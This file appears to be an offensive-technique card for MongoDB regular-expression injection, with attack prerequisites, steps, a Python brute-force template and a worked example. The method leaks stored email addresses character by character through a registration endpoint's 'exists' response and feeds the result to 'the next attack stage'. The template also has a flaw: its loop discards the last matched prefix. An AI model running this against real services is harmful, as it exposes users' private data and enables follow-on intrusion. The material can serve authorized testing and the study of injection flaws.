---
name: mongodb_regexp_injection_email_leak
vuln_type: nosqli
sub_technique: regexp_injection
category: exploitation
safety_level: safe
tags:
- nosql
- mongodb
- regex
- regexp-injection
- brute-force
- email-leak
---

# Mongodb Regexp Injection — Character-By-Character Data Leak

## When to Apply

The server converts user input to `new RegExp(input)` without sanitization and uses it in MongoDB queries like `findOne({field: regex})`. An attacker can inject regex metacharacters (`^`, `.*`, `$`, `[a-z]`, etc.) to brute-force existing data one character at a time. Typically found in registration duplicate checks, search, login, etc.

## Prerequisites

- User input is passed directly to `new RegExp()` or `{$regex: input}`
- Response differentiates between exists/not-exists (e.g. 400 'exists' vs 200 'ok')
- Response speed allows brute-force (no rate limiting or loose limits)

## Steps

1. Verify regex metacharacters work on the target field: send `^a.*` → check if existing data matches
2. Extend prefix one character at a time: `^guide_a.*`, `^guide_ab.*`, ... → if exists response, that character is confirmed
3. When no more characters match, the current prefix is the full value
4. Handle special characters: escape regex metacharacters (`$`, `*`, `+`, etc.) using character classes `[$]`, `[*]`
5. Use extracted value (email, token, etc.) for the next attack stage

## Code Template

```
import string, requests
url = f'{TARGET}/api/auth/register'
charset = list(string.ascii_lowercase + string.digits)
prefixes = ['^{known_prefix}']
while prefixes:
    nxt = []
    for pfx in prefixes:
        for ch in charset:
            r = requests.post(url, json={{'email': f'{{pfx}}{{ch}}.*', 'username': ''}})
            if '{exists_indicator}' in r.text:
                nxt.append(pfx + ch)
    prefixes = nxt
# if prefixes is empty, the last prefix is the full value
```

## Examples

### Example 1

- **field**: email
- **endpoint**: POST /api/auth/register
- **server_code**: User.findOne({email: new RegExp(['^', String(email), '$'].join(''), 'i')})
- **exists_indicator**: User already exists
- **charset**: a-z0-9

Email is converted to RegExp in the registration duplicate check. Bypass prefix check with `^prefix_` — even if the server constructs `'^' + '^prefix_a.*' + '$'` = `^^prefix_a.*$`, in JS regex `^^` is equivalent to `^`.
